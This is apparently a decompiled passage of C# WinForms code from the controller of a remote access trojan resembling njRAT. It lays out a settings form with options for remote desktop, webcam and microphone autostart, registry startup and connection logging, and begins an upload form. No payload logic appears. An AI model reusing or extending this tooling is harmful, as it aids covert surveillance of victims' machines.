		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = STNG.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = STNG.__ENCList.Count == STNG.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = STNG.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = STNG.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									STNG.__ENCList[num] = STNG.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						STNG.__ENCList.RemoveRange(num, STNG.__ENCList.Count - num);
						STNG.__ENCList.Capacity = STNG.__ENCList.Count;
					}
					STNG.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(STNG));
			this.GroupBox1 = new GroupBox();
			this.ShowAlert = new CheckBox();
			this.GroupBox2 = new GroupBox();
			this.Isu = new CheckBox();
			this.CheckBox1 = new CheckBox();
			this.CheckBox3 = new CheckBox();
			this.CheckBox6 = new CheckBox();
			this.CheckBox7 = new CheckBox();
			this.LOGLOGIN = new CheckBox();
			this.LOGCONNECTIONS = new CheckBox();
			this.LOGLERR = new CheckBox();
			this.LOGRERR = new CheckBox();
			this.LOGMSGS = new CheckBox();
			this.GroupBox3 = new GroupBox();
			this.CheckBox9 = new CheckBox();
			this.Label1 = new Label();
			this.SCI = new ComboBox();
			this.SCAUT = new CheckBox();
			this.GroupBox4 = new GroupBox();
			this.Label2 = new Label();
			this.CheckBox8 = new CheckBox();
			this.CAMI = new ComboBox();
			this.CAMAUT = new CheckBox();
			this.MICAUT = new CheckBox();
			this.GroupBox6 = new GroupBox();
			this.Label3 = new Label();
			this.scrI = new ComboBox();
			this.CheckBox2 = new CheckBox();
			this.CheckBox4 = new CheckBox();
			this.CheckBox5 = new CheckBox();
			this.Button1 = new Button();
			this.LogInComboBox2 = new LogInComboBox();
			this.LogInComboBox1 = new LogInComboBox();
			this.LogInComboBox3 = new LogInComboBox();
			this.LogInComboBox4 = new LogInComboBox();
			this.GroupBox2.SuspendLayout();
			this.GroupBox3.SuspendLayout();
			this.GroupBox4.SuspendLayout();
			this.SuspendLayout();
			this.GroupBox1.ForeColor = Color.LightSteelBlue;
			Control arg_207_0 = this.GroupBox1;
			Point location = new Point(329, 104);
			arg_207_0.Location = location;
			this.GroupBox1.Name = "GroupBox1";
			this.GroupBox1.RightToLeft = RightToLeft.Yes;
			Control arg_23F_0 = this.GroupBox1;
			Size size = new Size(46, 45);
			arg_23F_0.Size = size;
			this.GroupBox1.TabIndex = 0;
			this.GroupBox1.TabStop = false;
			this.GroupBox1.Text = "OnLogin";
			this.ShowAlert.AutoSize = true;
			Control arg_296_0 = this.ShowAlert;
			location = new Point(378, 320);
			arg_296_0.Location = location;
			this.ShowAlert.Name = "ShowAlert";
			this.ShowAlert.RightToLeft = RightToLeft.No;
			Control arg_2CE_0 = this.ShowAlert;
			size = new Size(78, 17);
			arg_2CE_0.Size = size;
			this.ShowAlert.TabIndex = 0;
			this.ShowAlert.Text = "Show Alert";
			this.ShowAlert.UseVisualStyleBackColor = true;
			this.GroupBox2.Controls.Add(this.Isu);
			this.GroupBox2.Controls.Add(this.LogInComboBox2);
			this.GroupBox2.Controls.Add(this.CheckBox1);
			this.GroupBox2.Controls.Add(this.CheckBox3);
			this.GroupBox2.Controls.Add(this.CheckBox6);
			this.GroupBox2.Controls.Add(this.CheckBox7);
			this.GroupBox2.FlatStyle = FlatStyle.Flat;
			this.GroupBox2.ForeColor = Color.LightSteelBlue;
			Control arg_3B9_0 = this.GroupBox2;
			location = new Point(124, 1);
			arg_3B9_0.Location = location;
			this.GroupBox2.Name = "GroupBox2";
			this.GroupBox2.RightToLeft = RightToLeft.Yes;
			Control arg_3F7_0 = this.GroupBox2;
			size = new Size(135, 131);
			arg_3F7_0.Size = size;
			this.GroupBox2.TabIndex = 1;
			this.GroupBox2.TabStop = false;
			this.GroupBox2.Text = "Logs";
			this.Isu.AutoSize = true;
			this.Isu.Checked = true;
			this.Isu.CheckState = CheckState.Checked;
			this.Isu.Cursor = Cursors.Hand;
			this.Isu.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Isu.ForeColor = Color.LightSteelBlue;
			Control arg_4A2_0 = this.Isu;
			location = new Point(42, 14);
			arg_4A2_0.Location = location;
			this.Isu.Name = "Isu";
			Control arg_4CD_0 = this.Isu;
			size = new Size(79, 18);
			arg_4CD_0.Size = size;
			this.Isu.TabIndex = 78;
			this.Isu.Text = "Login/Out";
			this.Isu.UseVisualStyleBackColor = true;
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.Checked = true;
			this.CheckBox1.CheckState = CheckState.Checked;
			this.CheckBox1.Cursor = Cursors.Hand;
			this.CheckBox1.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox1.ForeColor = Color.LightSteelBlue;
			Control arg_579_0 = this.CheckBox1;
			location = new Point(25, 34);
			arg_579_0.Location = location;
			this.CheckBox1.Name = "CheckBox1";
			Control arg_5A4_0 = this.CheckBox1;
			size = new Size(96, 18);
			arg_5A4_0.Size = size;
			this.CheckBox1.TabIndex = 79;
			this.CheckBox1.Text = "Connections";
			this.CheckBox1.UseVisualStyleBackColor = true;
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.Checked = true;
			this.CheckBox3.CheckState = CheckState.Checked;
			this.CheckBox3.Cursor = Cursors.Hand;
			this.CheckBox3.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox3.ForeColor = Color.LightSteelBlue;
			Control arg_650_0 = this.CheckBox3;
			location = new Point(17, 58);
			arg_650_0.Location = location;
			this.CheckBox3.Name = "CheckBox3";
			Control arg_67B_0 = this.CheckBox3;
			size = new Size(104, 18);
			arg_67B_0.Size = size;
			this.CheckBox3.TabIndex = 81;
			this.CheckBox3.Text = "Listner Errors";
			this.CheckBox3.UseVisualStyleBackColor = true;
			this.CheckBox6.AutoSize = true;
			this.CheckBox6.Checked = true;
			this.CheckBox6.CheckState = CheckState.Checked;
			this.CheckBox6.Cursor = Cursors.Hand;
			this.CheckBox6.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox6.ForeColor = Color.LightSteelBlue;
			Control arg_727_0 = this.CheckBox6;
			location = new Point(14, 79);
			arg_727_0.Location = location;
			this.CheckBox6.Name = "CheckBox6";
			Control arg_752_0 = this.CheckBox6;
			size = new Size(107, 18);
			arg_752_0.Size = size;
			this.CheckBox6.TabIndex = 84;
			this.CheckBox6.Text = "Remote Errors";
			this.CheckBox6.UseVisualStyleBackColor = true;
			this.CheckBox7.AutoSize = true;
			this.CheckBox7.Checked = true;
			this.CheckBox7.CheckState = CheckState.Checked;
			this.CheckBox7.Cursor = Cursors.Hand;
			this.CheckBox7.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox7.ForeColor = Color.LightSteelBlue;
			Control arg_7FE_0 = this.CheckBox7;
			location = new Point(37, 101);
			arg_7FE_0.Location = location;
			this.CheckBox7.Name = "CheckBox7";
			Control arg_829_0 = this.CheckBox7;
			size = new Size(84, 18);
			arg_829_0.Size = size;
			this.CheckBox7.TabIndex = 85;
			this.CheckBox7.Text = "Messages";
			this.CheckBox7.UseVisualStyleBackColor = true;
			this.LOGLOGIN.AutoSize = true;
			Control arg_87E_0 = this.LOGLOGIN;
			location = new Point(568, 40);
			arg_87E_0.Location = location;
			this.LOGLOGIN.Name = "LOGLOGIN";
			this.LOGLOGIN.RightToLeft = RightToLeft.No;
			Control arg_8B6_0 = this.LOGLOGIN;
			size = new Size(73, 17);
			arg_8B6_0.Size = size;
			this.LOGLOGIN.TabIndex = 5;
			this.LOGLOGIN.Text = "Login/Out";
			this.LOGLOGIN.UseVisualStyleBackColor = true;
			this.LOGCONNECTIONS.AutoSize = true;
			Control arg_90D_0 = this.LOGCONNECTIONS;
			location = new Point(568, 140);
			arg_90D_0.Location = location;
			this.LOGCONNECTIONS.Name = "LOGCONNECTIONS";
			this.LOGCONNECTIONS.RightToLeft = RightToLeft.No;
			Control arg_945_0 = this.LOGCONNECTIONS;
			size = new Size(85, 17);
			arg_945_0.Size = size;
			this.LOGCONNECTIONS.TabIndex = 4;
			this.LOGCONNECTIONS.Text = "Connections";
			this.LOGCONNECTIONS.UseVisualStyleBackColor = true;
			this.LOGLERR.AutoSize = true;
			Control arg_999_0 = this.LOGLERR;
			location = new Point(568, 115);
			arg_999_0.Location = location;
			this.LOGLERR.Name = "LOGLERR";
			this.LOGLERR.RightToLeft = RightToLeft.No;
			Control arg_9D1_0 = this.LOGLERR;
			size = new Size(90, 17);
			arg_9D1_0.Size = size;
			this.LOGLERR.TabIndex = 3;
			this.LOGLERR.Text = "Listner Errors";
			this.LOGLERR.UseVisualStyleBackColor = true;
			this.LOGRERR.AutoSize = true;
			Control arg_A25_0 = this.LOGRERR;
			location = new Point(568, 87);
			arg_A25_0.Location = location;
			this.LOGRERR.Name = "LOGRERR";
			this.LOGRERR.RightToLeft = RightToLeft.No;
			Control arg_A5D_0 = this.LOGRERR;
			size = new Size(95, 17);
			arg_A5D_0.Size = size;
			this.LOGRERR.TabIndex = 2;
			this.LOGRERR.Text = "Remote Errors";
			this.LOGRERR.UseVisualStyleBackColor = true;
			this.LOGMSGS.AutoSize = true;
			Control arg_AB1_0 = this.LOGMSGS;
			location = new Point(568, 64);
			arg_AB1_0.Location = location;
			this.LOGMSGS.Name = "LOGMSGS";
			this.LOGMSGS.RightToLeft = RightToLeft.No;
			Control arg_AE9_0 = this.LOGMSGS;
			size = new Size(73, 17);
			arg_AE9_0.Size = size;
			this.LOGMSGS.TabIndex = 1;
			this.LOGMSGS.Text = "Messages";
			this.LOGMSGS.UseVisualStyleBackColor = true;
			this.GroupBox3.Controls.Add(this.LogInComboBox3);
			this.GroupBox3.Controls.Add(this.CheckBox9);
			this.GroupBox3.Controls.Add(this.Label1);
			this.GroupBox3.ForeColor = Color.LightSteelBlue;
			Control arg_B81_0 = this.GroupBox3;
			location = new Point(3, 1);
			arg_B81_0.Location = location;
			this.GroupBox3.Name = "GroupBox3";
			Control arg_BAC_0 = this.GroupBox3;
			size = new Size(119, 64);
			arg_BAC_0.Size = size;
			this.GroupBox3.TabIndex = 2;
			this.GroupBox3.TabStop = false;
			this.GroupBox3.Text = "Remote Desktop";
			this.CheckBox9.AutoSize = true;
			this.CheckBox9.Checked = true;
			this.CheckBox9.CheckState = CheckState.Checked;
			this.CheckBox9.Cursor = Cursors.Hand;
			this.CheckBox9.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox9.ForeColor = Color.LightSteelBlue;
			Control arg_C57_0 = this.CheckBox9;
			location = new Point(9, 14);
			arg_C57_0.Location = location;
			this.CheckBox9.Name = "CheckBox9";
			Control arg_C82_0 = this.CheckBox9;
			size = new Size(78, 18);
			arg_C82_0.Size = size;
			this.CheckBox9.TabIndex = 87;
			this.CheckBox9.Text = "AutoStart";
			this.CheckBox9.UseVisualStyleBackColor = true;
			this.Label1.AutoSize = true;
			Control arg_CD3_0 = this.Label1;
			location = new Point(6, 39);
			arg_CD3_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_CFE_0 = this.Label1;
			size = new Size(26, 13);
			arg_CFE_0.Size = size;
			this.Label1.TabIndex = 3;
			this.Label1.Text = "Size";
			this.SCI.BackColor = Color.Black;
			this.SCI.DropDownStyle = ComboBoxStyle.DropDownList;
			this.SCI.FlatStyle = FlatStyle.Flat;
			this.SCI.ForeColor = Color.LightSteelBlue;
			this.SCI.FormattingEnabled = true;
			this.SCI.Items.AddRange(new object[]
			{
				"%100",
				"%95",
				"%90",
				"%85",
				"%80",
				"%75",
				"%70",
				"%65",
				"%60",
				"%55",
				"%50"
			});
			Control arg_E10_0 = this.SCI;
			location = new Point(439, 134);
			arg_E10_0.Location = location;
			this.SCI.Name = "SCI";
			Control arg_E3B_0 = this.SCI;
			size = new Size(71, 21);
			arg_E3B_0.Size = size;
			this.SCI.TabIndex = 2;
			this.SCAUT.AutoSize = true;
			Control arg_E71_0 = this.SCAUT;
			location = new Point(90, 306);
			arg_E71_0.Location = location;
			this.SCAUT.Name = "SCAUT";
			this.SCAUT.RightToLeft = RightToLeft.No;
			Control arg_EA9_0 = this.SCAUT;
			size = new Size(73, 17);
			arg_EA9_0.Size = size;
			this.SCAUT.TabIndex = 1;
			this.SCAUT.Text = "AutoStart";
			this.SCAUT.UseVisualStyleBackColor = true;
			this.GroupBox4.Controls.Add(this.LogInComboBox4);
			this.GroupBox4.Controls.Add(this.Label2);
			this.GroupBox4.Controls.Add(this.CheckBox8);
			this.GroupBox4.ForeColor = Color.LightSteelBlue;
			Control arg_F42_0 = this.GroupBox4;
			location = new Point(3, 68);
			arg_F42_0.Location = location;
			this.GroupBox4.Name = "GroupBox4";
			Control arg_F6D_0 = this.GroupBox4;
			size = new Size(119, 64);
			arg_F6D_0.Size = size;
			this.GroupBox4.TabIndex = 3;
			this.GroupBox4.TabStop = false;
			this.GroupBox4.Text = "Remote Cam";
			this.Label2.AutoSize = true;
			Control arg_FBD_0 = this.Label2;
			location = new Point(6, 39);
			arg_FBD_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_FE8_0 = this.Label2;
			size = new Size(26, 13);
			arg_FE8_0.Size = size;
			this.Label2.TabIndex = 3;
			this.Label2.Text = "Size";
			this.CheckBox8.AutoSize = true;
			this.CheckBox8.Checked = true;
			this.CheckBox8.CheckState = CheckState.Checked;
			this.CheckBox8.Cursor = Cursors.Hand;
			this.CheckBox8.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox8.ForeColor = Color.LightSteelBlue;
			Control arg_1086_0 = this.CheckBox8;
			location = new Point(9, 12);
			arg_1086_0.Location = location;
			this.CheckBox8.Name = "CheckBox8";
			Control arg_10B1_0 = this.CheckBox8;
			size = new Size(78, 18);
			arg_10B1_0.Size = size;
			this.CheckBox8.TabIndex = 86;
			this.CheckBox8.Text = "AutoStart";
			this.CheckBox8.UseVisualStyleBackColor = true;
			this.CAMI.BackColor = Color.Black;
			this.CAMI.DropDownStyle = ComboBoxStyle.DropDownList;
			this.CAMI.FlatStyle = FlatStyle.Flat;
			this.CAMI.ForeColor = Color.LightSteelBlue;
			this.CAMI.FormattingEnabled = true;
			this.CAMI.Items.AddRange(new object[]
			{
				"%100",
				"%95",
				"%90",
				"%85",
				"%80",
				"%75",
				"%70",
				"%65",
				"%60",
				"%55",
				"%50"
			});
			Control arg_11D1_0 = this.CAMI;
			location = new Point(265, 213);
			arg_11D1_0.Location = location;
			this.CAMI.Name = "CAMI";
			Control arg_11FC_0 = this.CAMI;
			size = new Size(71, 21);
			arg_11FC_0.Size = size;
			this.CAMI.TabIndex = 2;
			this.CAMAUT.AutoSize = true;
			Control arg_1235_0 = this.CAMAUT;
			location = new Point(196, 329);
			arg_1235_0.Location = location;
			this.CAMAUT.Name = "CAMAUT";
			this.CAMAUT.RightToLeft = RightToLeft.No;
			Control arg_126D_0 = this.CAMAUT;
			size = new Size(73, 17);
			arg_126D_0.Size = size;
			this.CAMAUT.TabIndex = 1;
			this.CAMAUT.Text = "AutoStart";
			this.CAMAUT.UseVisualStyleBackColor = true;
			this.MICAUT.AutoSize = true;
			Control arg_12C1_0 = this.MICAUT;
			location = new Point(90, 329);
			arg_12C1_0.Location = location;
			this.MICAUT.Name = "MICAUT";
			this.MICAUT.RightToLeft = RightToLeft.No;
			Control arg_12F9_0 = this.MICAUT;
			size = new Size(73, 17);
			arg_12F9_0.Size = size;
			this.MICAUT.TabIndex = 1;
			this.MICAUT.Text = "AutoStart";
			this.MICAUT.UseVisualStyleBackColor = true;
			this.GroupBox6.ForeColor = Color.LightSteelBlue;
			Control arg_1350_0 = this.GroupBox6;
			location = new Point(3, 244);
			arg_1350_0.Location = location;
			this.GroupBox6.Name = "GroupBox6";
			this.GroupBox6.RightToLeft = RightToLeft.Yes;
			Control arg_1388_0 = this.GroupBox6;
			size = new Size(119, 14);
			arg_1388_0.Size = size;
			this.GroupBox6.TabIndex = 5;
			this.GroupBox6.TabStop = false;
			this.GroupBox6.Text = "Screen";
			this.Label3.AutoSize = true;
			this.Label3.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			Control arg_13FD_0 = this.Label3;
			location = new Point(138, 264);
			arg_13FD_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_1428_0 = this.Label3;
			size = new Size(89, 14);
			arg_1428_0.Size = size;
			this.Label3.TabIndex = 3;
			this.Label3.Text = "Refresh Speed";
			this.scrI.BackColor = Color.Black;
			this.scrI.DropDownStyle = ComboBoxStyle.DropDownList;
			this.scrI.FlatStyle = FlatStyle.Flat;
			this.scrI.ForeColor = Color.LightSteelBlue;
			this.scrI.FormattingEnabled = true;
			this.scrI.Items.AddRange(new object[]
			{
				"Ultra",
				"Fast",
				"Good",
				"Slow",
				"Slower"
			});
			Control arg_14F7_0 = this.scrI;
			location = new Point(7, 264);
			arg_14F7_0.Location = location;
			this.scrI.Name = "scrI";
			this.scrI.RightToLeft = RightToLeft.No;
			Control arg_152F_0 = this.scrI;
			size = new Size(105, 21);
			arg_152F_0.Size = size;
			this.scrI.TabIndex = 2;
			this.CheckBox2.AutoSize = true;
			this.CheckBox2.Checked = true;
			this.CheckBox2.CheckState = CheckState.Checked;
			this.CheckBox2.Cursor = Cursors.Hand;
			this.CheckBox2.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox2.ForeColor = Color.LightSteelBlue;
			Control arg_15C2_0 = this.CheckBox2;
			location = new Point(378, 183);
			arg_15C2_0.Location = location;
			this.CheckBox2.Name = "CheckBox2";
			Control arg_15ED_0 = this.CheckBox2;
			size = new Size(106, 18);
			arg_15ED_0.Size = size;
			this.CheckBox2.TabIndex = 80;
			this.CheckBox2.Text = "Registy StarUp";
			this.CheckBox2.UseVisualStyleBackColor = true;
			this.CheckBox4.AutoSize = true;
			this.CheckBox4.Checked = true;
			this.CheckBox4.CheckState = CheckState.Checked;
			this.CheckBox4.Cursor = Cursors.Hand;
			this.CheckBox4.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox4.ForeColor = Color.LightSteelBlue;
			Control arg_169F_0 = this.CheckBox4;
			location = new Point(389, 216);
			arg_169F_0.Location = location;
			this.CheckBox4.Name = "CheckBox4";
			Control arg_16CA_0 = this.CheckBox4;
			size = new Size(106, 18);
			arg_16CA_0.Size = size;
			this.CheckBox4.TabIndex = 82;
			this.CheckBox4.Text = "Registy StarUp";
			this.CheckBox4.UseVisualStyleBackColor = true;
			this.CheckBox5.AutoSize = true;
			this.CheckBox5.Checked = true;
			this.CheckBox5.CheckState = CheckState.Checked;
			this.CheckBox5.Cursor = Cursors.Hand;
			this.CheckBox5.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox5.ForeColor = Color.LightSteelBlue;
			Control arg_177C_0 = this.CheckBox5;
			location = new Point(389, 254);
			arg_177C_0.Location = location;
			this.CheckBox5.Name = "CheckBox5";
			Control arg_17A7_0 = this.CheckBox5;
			size = new Size(106, 18);
			arg_17A7_0.Size = size;
			this.CheckBox5.TabIndex = 83;
			this.CheckBox5.Text = "Registy StarUp";
			this.CheckBox5.UseVisualStyleBackColor = true;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_182A_0 = this.Button1;
			location = new Point(3, 134);
			arg_182A_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_1858_0 = this.Button1;
			size = new Size(256, 25);
			arg_1858_0.Size = size;
			this.Button1.TabIndex = 7;
			this.Button1.Text = "Save";
			this.Button1.UseVisualStyleBackColor = true;
			this.LogInComboBox2.ArrowColour = Color.Black;
			this.LogInComboBox2.BackColor = Color.Transparent;
			this.LogInComboBox2.BaseColour = Color.Black;
			this.LogInComboBox2.BorderColour = Color.White;
			this.LogInComboBox2.DrawMode = DrawMode.OwnerDrawFixed;
			this.LogInComboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
			this.LogInComboBox2.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.LogInComboBox2.FontColour = Color.LightSteelBlue;
			this.LogInComboBox2.FormattingEnabled = true;
			this.LogInComboBox2.Items.AddRange(new object[]
			{
				"%100",
				"%95",
				"%90",
				"%85",
				"%80",
				"%75",
				"%70",
				"%65",
				"%60",
				"%55",
				"%50"
			});
			this.LogInComboBox2.LineColour = Color.Black;
			Control arg_19D3_0 = this.LogInComboBox2;
			location = new Point(-96, 34);
			arg_19D3_0.Location = location;
			this.LogInComboBox2.Name = "LogInComboBox2";
			Control arg_19FE_0 = this.LogInComboBox2;
			size = new Size(62, 23);
			arg_19FE_0.Size = size;
			this.LogInComboBox2.SqaureColour = Color.FromArgb(47, 47, 47);
			this.LogInComboBox2.SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.LogInComboBox2.StartIndex = 0;
			this.LogInComboBox2.TabIndex = 84;
			this.LogInComboBox1.ArrowColour = Color.Black;
			this.LogInComboBox1.BackColor = Color.Transparent;
			this.LogInComboBox1.BaseColour = Color.Black;
			this.LogInComboBox1.BorderColour = Color.White;
			this.LogInComboBox1.DrawMode = DrawMode.OwnerDrawFixed;
			this.LogInComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
			this.LogInComboBox1.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.LogInComboBox1.FontColour = Color.LightSteelBlue;
			this.LogInComboBox1.FormattingEnabled = true;
			this.LogInComboBox1.Items.AddRange(new object[]
			{
				"%100",
				"%95",
				"%90",
				"%85",
				"%80",
				"%75",
				"%70",
				"%65",
				"%60",
				"%55",
				"%50"
			});
			this.LogInComboBox1.LineColour = Color.Black;
			Control arg_1B9A_0 = this.LogInComboBox1;
			location = new Point(415, 68);
			arg_1B9A_0.Location = location;
			this.LogInComboBox1.Name = "LogInComboBox1";
			Control arg_1BC5_0 = this.LogInComboBox1;
			size = new Size(69, 23);
			arg_1BC5_0.Size = size;
			this.LogInComboBox1.SqaureColour = Color.FromArgb(47, 47, 47);
			this.LogInComboBox1.SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.LogInComboBox1.StartIndex = 0;
			this.LogInComboBox1.TabIndex = 85;
			this.LogInComboBox3.ArrowColour = Color.Black;
			this.LogInComboBox3.BackColor = Color.Transparent;
			this.LogInComboBox3.BaseColour = Color.Black;
			this.LogInComboBox3.BorderColour = Color.White;
			this.LogInComboBox3.DrawMode = DrawMode.OwnerDrawFixed;
			this.LogInComboBox3.DropDownStyle = ComboBoxStyle.DropDownList;
			this.LogInComboBox3.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.LogInComboBox3.FontColour = Color.LightSteelBlue;
			this.LogInComboBox3.FormattingEnabled = true;
			this.LogInComboBox3.Items.AddRange(new object[]
			{
				"%100",
				"%95",
				"%90",
				"%85",
				"%80",
				"%75",
				"%70",
				"%65",
				"%60",
				"%55",
				"%50"
			});
			this.LogInComboBox3.LineColour = Color.Black;
			Control arg_1D5E_0 = this.LogInComboBox3;
			location = new Point(40, 32);
			arg_1D5E_0.Location = location;
			this.LogInComboBox3.Name = "LogInComboBox3";
			Control arg_1D89_0 = this.LogInComboBox3;
			size = new Size(69, 23);
			arg_1D89_0.Size = size;
			this.LogInComboBox3.SqaureColour = Color.FromArgb(47, 47, 47);
			this.LogInComboBox3.SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.LogInComboBox3.StartIndex = 0;
			this.LogInComboBox3.TabIndex = 86;
			this.LogInComboBox4.ArrowColour = Color.Black;
			this.LogInComboBox4.BackColor = Color.Transparent;
			this.LogInComboBox4.BaseColour = Color.Black;
			this.LogInComboBox4.BorderColour = Color.White;
			this.LogInComboBox4.DrawMode = DrawMode.OwnerDrawFixed;
			this.LogInComboBox4.DropDownStyle = ComboBoxStyle.DropDownList;
			this.LogInComboBox4.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.LogInComboBox4.FontColour = Color.LightSteelBlue;
			this.LogInComboBox4.FormattingEnabled = true;
			this.LogInComboBox4.Items.AddRange(new object[]
			{
				"%100",
				"%95",
				"%90",
				"%85",
				"%80",
				"%75",
				"%70",
				"%65",
				"%60",
				"%55",
				"%50"
			});
			this.LogInComboBox4.LineColour = Color.Black;
			Control arg_1F22_0 = this.LogInComboBox4;
			location = new Point(40, 29);
			arg_1F22_0.Location = location;
			this.LogInComboBox4.Name = "LogInComboBox4";
			Control arg_1F4D_0 = this.LogInComboBox4;
			size = new Size(69, 23);
			arg_1F4D_0.Size = size;
			this.LogInComboBox4.SqaureColour = Color.FromArgb(47, 47, 47);
			this.LogInComboBox4.SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.LogInComboBox4.StartIndex = 0;
			this.LogInComboBox4.TabIndex = 87;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = SystemColors.ActiveCaptionText;
			size = new Size(260, 160);
			this.ClientSize = size;
			this.Controls.Add(this.LogInComboBox1);
			this.Controls.Add(this.CAMI);
			this.Controls.Add(this.SCI);
			this.Controls.Add(this.Label3);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.scrI);
			this.Controls.Add(this.LOGLOGIN);
			this.Controls.Add(this.ShowAlert);
			this.Controls.Add(this.LOGCONNECTIONS);
			this.Controls.Add(this.MICAUT);
			this.Controls.Add(this.LOGLERR);
			this.Controls.Add(this.CAMAUT);
			this.Controls.Add(this.LOGRERR);
			this.Controls.Add(this.SCAUT);
			this.Controls.Add(this.LOGMSGS);
			this.Controls.Add(this.CheckBox5);
			this.Controls.Add(this.CheckBox4);
			this.Controls.Add(this.CheckBox2);
			this.Controls.Add(this.GroupBox6);
			this.Controls.Add(this.GroupBox4);
			this.Controls.Add(this.GroupBox3);
			this.Controls.Add(this.GroupBox2);
			this.Controls.Add(this.GroupBox1);
			this.ForeColor = Color.White;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.MaximizeBox = false;
			size = new Size(276, 194);
			this.MaximumSize = size;
			size = new Size(276, 194);
			this.MinimumSize = size;
			this.Name = "STNG";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Settings";
			this.GroupBox2.ResumeLayout(false);
			this.GroupBox2.PerformLayout();
			this.GroupBox3.ResumeLayout(false);
			this.GroupBox3.PerformLayout();
			this.GroupBox4.ResumeLayout(false);
			this.GroupBox4.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void STNG_Load(object sender, EventArgs e)
		{
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 190;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 290;
				this.Text = "Settings: " + Environment.MachineName + "\\@" + Environment.UserName;
				try
				{
					string empty = string.Empty;
					string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
				}
				catch (Exception expr_84)
				{
					ProjectData.SetProjectError(expr_84);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void Button1_Click(object sender, EventArgs e)
		{
		}

		private void Button1_Click_1(object sender, EventArgs e)
		{
			this.Close();
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class up : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("GroupBox1")]
		private GroupBox _GroupBox1;

		[AccessedThroughProperty("Lv1")]
		private LV _Lv1;

		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		public Client c;

		public string FNNN;

		public FileStream FS;

		public int os;

		public Client sk;

		public int SZ;

		public string TMP;

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ProgressBar1_Click);
